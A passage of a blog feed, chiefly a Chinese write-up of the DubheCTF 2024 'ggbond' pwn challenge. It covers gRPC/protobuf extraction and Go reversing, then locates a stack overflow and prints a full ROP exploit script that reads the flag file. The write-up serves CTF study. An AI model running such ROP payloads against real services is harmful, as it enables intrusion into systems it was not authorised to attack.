\x8bC$\x03\xcf\x03\xc7\x89M\xec\x89E\xf49s\x18vI\x8b\x14\xb1\x8dE\xe0\x03\xd73\xc9+\xd0\x8dd$\x00\x8d\x04\x11\x8aD\x05\xe0:D\r\xe0u\x06A\x83\xf9\x06|\xed\x83\xf9\x06u\x18\x8bM\xf0\x8dE\xfcP\x8bE\xf4\x0f\xb7\x04p\x8b\x04\x81\x03\xc7\xff\xd0\x83\xc4\x04\x8bM\xecF;s\x18r\xb7_^[\x8b\xe5]\xc3\x8bz\x10\xeb\x82&#x27;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">windows pwn</summary>
    
    
    
    <category term="pwn" scheme="https://ixout.github.io/categories/pwn/"/>
    
    
    <category term="windows" scheme="https://ixout.github.io/tags/windows/"/>
    
  </entry>
  
  <entry>
    <title>dubhe2024-ggbond复现</title>
    <link href="https://ixout.github.io/posts/33061/"/>
    <id>https://ixout.github.io/posts/33061/</id>
    <published>2024-04-14T13:26:08.000Z</published>
    <updated>2024-04-18T09:11:31.842Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://ywhkkx.github.io/2024/03/21/DubheCTF2024/">DubheCTF2024 | Pwn进你的心 (ywhkkx.github.io)</a></p><p><a href="https://akaieurus.github.io/2024/03/19/天枢ctf-wp/#cvm">2024 DubheCTF pwn wp - Eurus禁止摆烂！ (akaieurus.github.io)</a></p><p><a href="https://starrysky1004.github.io/2024/03/23/xctf-ggbond-fu-xian/xctf-ggbond-fu-xian/">xctf-ggbond复现 | StarrySky (starrysky1004.github.io)</a></p><h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>提供的附件如下</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">├── bin</span><br><span class="line">│   ├── ctf.xinetd</span><br><span class="line">│   ├── flag</span><br><span class="line">│   ├── pwn</span><br><span class="line">│   ├── pwn.i64</span><br><span class="line">│   └── start.sh</span><br><span class="line">├── docker-compose.yml</span><br><span class="line">├── Dockerfile</span><br><span class="line">└── pow.py</span><br></pre></td></tr></table></figure><p>除了二进制文件以及Dockfile部署文件还有一个<code>pow.py</code></p><p><strong>pow.py</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"></span><br><span class="line"><span class="comment">#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~#</span></span><br><span class="line">    <span class="comment"># The container will be destroyed after 20 seconds </span></span><br><span class="line">    <span class="comment"># or when the &#x27;p&#x27; socket connection is closed.</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># The Docker container challenge&#x27;s internal network cannot </span></span><br><span class="line">    <span class="comment"># connect to the external network.</span></span><br><span class="line"><span class="comment">#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~#</span></span><br><span class="line"></span><br><span class="line">remote_ip = <span class="string">&#x27;&#x27;</span></span><br><span class="line">remote_port = <span class="number">1337</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pow</span>():</span><br><span class="line">    p = remote(remote_ip, remote_port)</span><br><span class="line">    rev = p.recvuntil(<span class="string">b&#x27; == &#x27;</span>).decode()</span><br><span class="line">    pattern = <span class="string">r&#x27;xxxx\+([a-zA-Z0-9]+)&#x27;</span></span><br><span class="line">    rev = re.search(pattern, rev).group(<span class="number">1</span>)</span><br><span class="line">    target_digest = p.recv(<span class="number">64</span>).decode()</span><br><span class="line"></span><br><span class="line">    characters = string.ascii_letters + string.digits</span><br><span class="line">    all_combinations = [<span class="string">&#x27;&#x27;</span>.join(comb) <span class="keyword">for</span> comb <span class="keyword">in</span> itertools.product(characters, repeat=<span class="number">4</span>)]</span><br><span class="line">    <span class="keyword">for</span> comb <span class="keyword">in</span> all_combinations:</span><br><span class="line">        proof = comb+rev</span><br><span class="line">        digest = sha256(proof.encode()).hexdigest()</span><br><span class="line">        <span class="keyword">if</span> target_digest == digest:</span><br><span class="line">            result = comb</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    p.send(result) </span><br><span class="line">    </span><br><span class="line">    p.recvuntil(<span class="string">b&#x27; nc &#x27;</span>)</span><br><span class="line">    rev = p.recvline().decode()</span><br><span class="line">    pattern = <span class="string">r&#x27;(\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;)\s(\d+)&#x27;</span></span><br><span class="line">    result = re.search(pattern, rev)</span><br><span class="line">    target_ip = result.group(<span class="number">1</span>)</span><br><span class="line">    target_port = <span class="built_in">int</span>(result.group(<span class="number">2</span>))</span><br><span class="line">    sleep(<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">return</span> target_ip, target_port</span><br><span class="line">        </span><br><span class="line">target_ip, target_port=<span class="built_in">pow</span>()</span><br></pre></td></tr></table></figure><p>gpt一下</p><p><code>pow</code>应该是<code>Proof of Work</code>的缩写,PoW 是一种网络协议的机制，用于防止网络滥用，比如防止DDoS攻击和垃圾邮件。在这里，服务器会给客户端一个工作量证明（Proof of Work）的问题，客户端需要解决这个问题才能与服务器建立连接。解决这个问题通常需要一些计算资源和时间，但验证答案很简单。</p><p>这段代码的主要作用是通过解决<code>Proof of Work (PoW)</code>来获取远程服务器指定的下一目标<code>IP</code>地址和端口号,其实我们并不需要多做关注</p><h2 id="gRPC"><a href="#gRPC" class="headerlink" title="gRPC"></a>gRPC</h2><p>文件夹的名字叫做gRPC,搜索一下</p><blockquote><p><code>RPC (Remote Procedure Call)</code>远程过程调用，<strong>允许一台计算机通过网络调用另一台计算机上的程序或函数</strong>，<code>RPC</code>框架通常负责打包（序列化）请求参数，传输消息，在服务器端解包（反序列化）参数，执行远程过程，并将结果返回给客户端</p></blockquote><p><code>gRPC</code>是由<code>Google</code>开发的现代开源高性能<code>RPC</code>框架，支持多种编程语言。<code>gRPC</code>默认使用<code>Protocol Buffers（protobuf）</code>作为接口定义语言（<code>IDL</code>）和其底层消息交换格式，提供了一种简洁高效的方式来定义服务和生成客户端和服务器代码</p><p><a href="https://zhuanlan.zhihu.com/p/363672930">参考</a></p><h2 id="pbtk"><a href="#pbtk" class="headerlink" title="pbtk"></a>pbtk</h2><p>前面提到gRPC使用protobuf作为接口语言</p><p>于是有一个专门的工具pbtk可以提取<strong><code>Protobuf</code>结构</strong>，将其转换回可替代的<code>.proto</code></p><p>可以使用<code>.gui.py</code>图形化操作</p><p>也可以直接使用<code>pbtk/extractors/from_binary.py</code>脚本</p><p>然后我们可以在分离出的protobuf结构体中找到<code>ggbond.proto</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">syntax = <span class="string">&quot;proto3&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> GGBond;</span><br><span class="line"></span><br><span class="line">option go_package = <span class="string">&quot;./;ggbond&quot;</span>;</span><br><span class="line"></span><br><span class="line">service GGBondServer &#123;</span><br><span class="line">    rpc Handler(Request) returns (Response);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">message Request &#123;</span><br><span class="line">    oneof request &#123;</span><br><span class="line">        WhoamiRequest whoami = <span class="number">100</span>;</span><br><span class="line">        RoleChangeRequest role_change = <span class="number">101</span>;</span><br><span class="line">        RepeaterRequest repeater = <span class="number">102</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">message Response &#123;</span><br><span class="line">    oneof response &#123;</span><br><span class="line">        WhoamiResponse whoami = <span class="number">200</span>;</span><br><span class="line">        RoleChangeResponse role_change = <span class="number">201</span>;</span><br><span class="line">        RepeaterResponse repeater = <span class="number">202</span>;</span><br><span class="line">        ErrorResponse <span class="type">error</span> = <span class="number">444</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">message WhoamiRequest &#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">message WhoamiResponse &#123;</span><br><span class="line">    <span class="type">string</span> message = <span class="number">2000</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">message RoleChangeRequest &#123;</span><br><span class="line">    <span class="type">uint32</span> role = <span class="number">1001</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">message RoleChangeResponse &#123;</span><br><span class="line">    <span class="type">string</span> message = <span class="number">2001</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">message RepeaterRequest &#123;</span><br><span class="line">    <span class="type">string</span> message = <span class="number">1002</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">message RepeaterResponse &#123;</span><br><span class="line">    <span class="type">string</span> message = <span class="number">2002</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">message ErrorResponse &#123;</span><br><span class="line">    <span class="type">string</span> message = <span class="number">4444</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在protobuf中，<code>service</code> 关键字用于定义一个服务，而 <code>rpc</code> 关键字用于定义该服务中的远程过程调用</p><p><code>rpc Handler(Request) returns (Response)</code>：这行代码定义了一个名为 <code>Handler</code> 的远程过程调用。它接收一个 <code>Request</code> 类型的参数，并返回一个 <code>Response</code> 类型的响应。</p><p>其他数据都有定义</p><h2 id="grpc-tools"><a href="#grpc-tools" class="headerlink" title="grpc_tools"></a>grpc_tools</h2><p>我们需要与grpc进程进行交互,那么就需要将上一步中分离出来的proto文件编译为可供python引用的形式</p><p>首先安装<code>grpc_tools</code>:</p><p><code>pip install grpcio-tools</code></p><p><code>grpc_tools</code> 是 Google 开发的一组工具，用于帮助开发者使用 gRPC框架。我们这里安装的是对应python版本的</p><p>然后执行</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m grpc_tools.protoc -I. --python_out=. --grpc_python_out=. ggbond.proto</span><br></pre></td></tr></table></figure><p>就会生成<code>ggbond_pb2_grpc.py</code> 、<code>ggbond_pb2.py</code></p><p><code>ggbond_pb2_grpc.py</code>：</p><ul><li><code>ggbond_pb2_grpc.py</code> 包含了根据 <code>.proto</code> 文件生成的 gRPC 客户端和服务器的代码。</li><li><u>这个文件中定义了 gRPC 客户端和服务器的存根（Stub）和服务器（Servicer）类。</u></li><li>客户端使用存根类来发送请求并接收响应，服务器使用服务器类来实现服务方法。</li><li>存根和服务器类中的方法是根据 <code>.proto</code> 文件中定义的服务和远程过程调用（RPC）自动生成的。</li></ul><p><code>ggbond_pb2.py</code>：</p><ul><li><code>ggbond_pb2.py</code> 包含了根据 <code>.proto</code> 文件生成的所有消息类型和相关的数据结构。</li><li>这个文件中定义了 <code>.proto</code> 文件中所描述的所有消息类型，以及消息类型之间的关系。</li><li>在 gRPC 通信中，客户端和服务器都需要使用这些消息类型来构建请求和响应消息。</li></ul><p>来个例子</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> grpc</span><br><span class="line"><span class="keyword">import</span> ggbond_pb2</span><br><span class="line"><span class="keyword">import</span> ggbond_pb2_grpc</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment"># 创建 gRPC 通道</span></span><br><span class="line">    channel = grpc.insecure_channel(<span class="string">&#x27;localhost:23334&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 创建 gRPC 客户端存根</span></span><br><span class="line">    stub = ggbond_pb2_grpc.GGBondServerStub(channel)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 构造请求消息</span></span><br><span class="line">    request = ggbond_pb2.Request(</span><br><span class="line">        whoami=ggbond_pb2.WhoamiRequest(),  <span class="comment"># 选择要发送的请求类型,whoami对象，值来自构造函数</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 调用远程过程调用（RPC）</span></span><br><span class="line">    response = stub.Handler(request)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 处理响应</span></span><br><span class="line">    <span class="keyword">if</span> response.HasField(<span class="string">&#x27;whoami&#x27;</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Received response: &quot;</span>, response.whoami.message)</span><br><span class="line">    <span class="keyword">elif</span> response.HasField(<span class="string">&#x27;error&#x27;</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Error occurred: &quot;</span>, response.error.message)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>结果:<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; python gRPC_test.py </span><br><span class="line">Received response:  I<span class="string">&#x27;m GGBOND</span></span><br></pre></td></tr></table></figure></p><p>那么整个交互的脚本就可以写出来了</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> grpc</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ggbond_pb2</span><br><span class="line"><span class="keyword">import</span> ggbond_pb2_grpc</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">whoami</span>(<span class="params">chan</span>):</span><br><span class="line">    stub=ggbond_pb2_grpc.GGBondServerStub(chan)</span><br><span class="line">    respond=stub.Handler(ggbond_pb2.Request(whoami=ggbond_pb2.WhoamiRequest()))</span><br><span class="line">    <span class="keyword">return</span> respond</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">role_change</span>(<span class="params">chan,role</span>):</span><br><span class="line">    stub=ggbond_pb2_grpc.GGBondServerStub(chan)</span><br><span class="line">    respond=stub.Handler(ggbond_pb2.Request(role_change=ggbond_pb2.RoleChangeRequest(role=role)))</span><br><span class="line">    <span class="keyword">return</span> respond</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">repeater</span>(<span class="params">chan,message</span>):</span><br><span class="line">    stub=ggbond_pb2_grpc.GGBondServerStub(chan)</span><br><span class="line">    respond=stub.Handler(ggbond_pb2.Request(repeater=ggbond_pb2.RepeaterRequest(message=base64.b64encode(message))))</span><br><span class="line">    <span class="keyword">return</span> respond</span><br><span class="line">    </span><br><span class="line">channel=grpc.insecure_channel(<span class="string">&#x27;localhost:23334&#x27;</span>)</span><br></pre></td></tr></table></figure><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>之后就是恶心的go逆向了</p><p>这题还是取出了符号的,不过现在有8.3的ida pro可以使用,直接能够恢复符号</p><p>或者没有的话使用AlapaGo插件也行</p><p>在一坨代码中找到了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">google_golang_org_grpc__ptr_Server_RegisterService(v62, &amp;stru_C59860, v65);</span><br></pre></td></tr></table></figure><p>看函数名字像是注册服务器</p><p>跟进,发现其内部使用了第二个参数比较多,而恰好ida又将其识别成了结构体</p><p>跟进看看</p><p>ida将其识别成了<code>grpc_ServiceDesc</code>结构体,在ida中可以找到相关定义,这里直接贴源码</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> ServiceDesc <span class="keyword">struct</span> &#123;</span><br><span class="line">ServiceName <span class="type">string</span></span><br><span class="line"><span class="comment">// The pointer to the service interface. Used to check whether the user</span></span><br><span class="line"><span class="comment">// provided implementation satisfies the interface requirements.</span></span><br><span class="line">HandlerType any</span><br><span class="line">Methods     []MethodDesc</span><br><span class="line">Streams     []StreamDesc</span><br><span class="line">Metadata    any</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> MethodDesc <span class="keyword">struct</span> &#123;</span><br><span class="line">MethodName <span class="type">string</span></span><br><span class="line">Handler    methodHandler</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> StreamDesc <span class="keyword">struct</span> &#123;</span><br><span class="line">StreamName <span class="type">string</span>        </span><br><span class="line">Handler    StreamHandler </span><br><span class="line"></span><br><span class="line">ServerStreams <span class="type">bool</span> </span><br><span class="line">ClientStreams <span class="type">bool</span> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后我们可以在MethodDesc中找到handler函数</p><p>不过这都是复现时才知道的,实际要发现还是要靠一些观察力,或者直接去搜函数名字筛选</p><p>找到handler函数在<code>7ED300</code></p><p>在这里<code>(*(void (__golang **)(void *, __int64, __int64, ggbond_Request *))(v21 + 24))(a2, v31, a4, p_ggbond_Request);</code>进行了功能调用</p><p>调试跟一下</p><p>发现最终是调用<code>0x7ed860</code>,找到,又是一坨</p><p>最终发现当role为3时</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0LL</span>; i &lt; (__int64)(<span class="number">3</span> * (len &gt;&gt; <span class="number">2</span>)); ++i )</span><br><span class="line">&#123;</span><br><span class="line">  *(_BYTE *)v50 = *v51;</span><br><span class="line">  v50 = (__int128 *)((<span class="type">char</span> *)v50 + <span class="number">1</span>);</span><br><span class="line">  ++v51;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>repeater可以往栈上写无限制数据(<u>go题最后果然都是栈溢出</u>)</p><p><strong>exp:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> grpc</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ggbond_pb2</span><br><span class="line"><span class="keyword">import</span> ggbond_pb2_grpc</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">whoami</span>(<span class="params">chan</span>):</span><br><span class="line">    stub=ggbond_pb2_grpc.GGBondServerStub(chan)</span><br><span class="line">    respond=stub.Handler(ggbond_pb2.Request(whoami=ggbond_pb2.WhoamiRequest()))</span><br><span class="line">    <span class="keyword">return</span> respond</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">role_change</span>(<span class="params">chan,role</span>):</span><br><span class="line">    stub=ggbond_pb2_grpc.GGBondServerStub(chan)</span><br><span class="line">    respond=stub.Handler(ggbond_pb2.Request(role_change=ggbond_pb2.RoleChangeRequest(role=role)))</span><br><span class="line">    <span class="keyword">return</span> respond</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">repeater</span>(<span class="params">chan,message</span>):</span><br><span class="line">    stub=ggbond_pb2_grpc.GGBondServerStub(chan)</span><br><span class="line">    respond=stub.Handler(ggbond_pb2.Request(repeater=ggbond_pb2.RepeaterRequest(message=base64.b64encode(message))))</span><br><span class="line">    <span class="keyword">return</span> respond</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">23334</span>)</span><br><span class="line">channel=grpc.insecure_channel(<span class="string">&#x27;localhost:23334&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(role_change(channel,<span class="number">3</span>))</span><br><span class="line">rdi_addr=<span class="number">0x401537</span></span><br><span class="line">rsi_addr=<span class="number">0x422398</span></span><br><span class="line">rdx_addr=<span class="number">0x461bd1</span></span><br><span class="line">rax_addr=<span class="number">0x4101e6</span></span><br><span class="line">syscall_addr=<span class="number">0x40452C</span></span><br><span class="line">flag_addr=<span class="number">0x7FAEEC</span></span><br><span class="line">bss_addr=<span class="number">0xC90000</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xc8</span></span><br><span class="line">payload+=p64(rdi_addr)+p64(flag_addr)+p64(rsi_addr)+p64(<span class="number">0</span>)+p64(rdx_addr)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(rax_addr)+p64(<span class="number">2</span>)+p64(syscall_addr)</span><br><span class="line">payload+=p64(rdi_addr)+p64(<span class="number">9</span>)+p64(rsi_addr)+p64(bss_addr)+p64(rdx_addr)+p64(<span class="number">0x30</span>)</span><br><span class="line">payload+=p64(rax_addr)+p64(<span class="number">0</span>)+p64(syscall_addr)</span><br><span class="line">payload+=p64(rdi_addr)+p64(<span class="number">7</span>)+p64(rsi_addr)+p64(bss_addr)+p64(rdx_addr)+p64(<span class="number">0x30</span>)<span class="comment">#7是通过遍历找到的socket fd</span></span><br><span class="line">payload+=p64(rax_addr)+p64(<span class="number">1</span>)+p64(syscall_addr)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">repeater(channel,payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="built_in">print</span>(p.recv(<span class="number">0x1000</span>))</span><br></pre></td></tr></table></figure><p>flag字符串是通过自带的字符串截取出来的</p><p>由于我们只是跟进程的一个端口23334打交道,所以就算getshell也没办法与其交互,因为shell继承的标准流是进程的</p><p>当然如果像binsh这些方法应该是可行的,不过显然有点麻烦</p><p>所以通过orw是一个比较好的选择</p><p>通过现成的 socket 传输 flag,但这样会导致结构错误从而使 python 没法处理数据，但是我们可以直接抓包获取 flag:</p><p><code>sudo tcpdump -i eth0 -w flag.pcap</code></p><p>除此以外还有另一种方法：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p = remote(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">23334</span>)</span><br><span class="line">conn = grpc.insecure_channel(<span class="string">&#x27;localhost:23334&#x27;</span>)</span><br></pre></td></tr></table></figure><p>这两个虽然是不同的连接，但 p.recv 仍然可以接受 conn 的数据</p><hr><p>这类开放端口的服务器题目大多会有这个问题,可以用作参考</p>]]></content>
    
    
    <summary type="html">go</summary>
    
    
    
    <category term="pwn" scheme="https://ixout.github.io/categories/pwn/"/>
    
    
    <category term="grpc" scheme="https://ixout.github.io/tags/grpc/"/>
    
    <category term="protobuf" scheme="https://ixout.github.io/tags/protobuf/"/>
    
  </entry>
  
  <entry>
    <title>llvm-pass初识</title>
    <link href="https://ixout.github.io/posts/10060/"/>
    <id>https://ixout.github.io/posts/10060/</id>
    <published>2024-04-12T04:36:45.000Z</published>
    <updated>2024-04-18T09:11:31.845Z</updated>
    
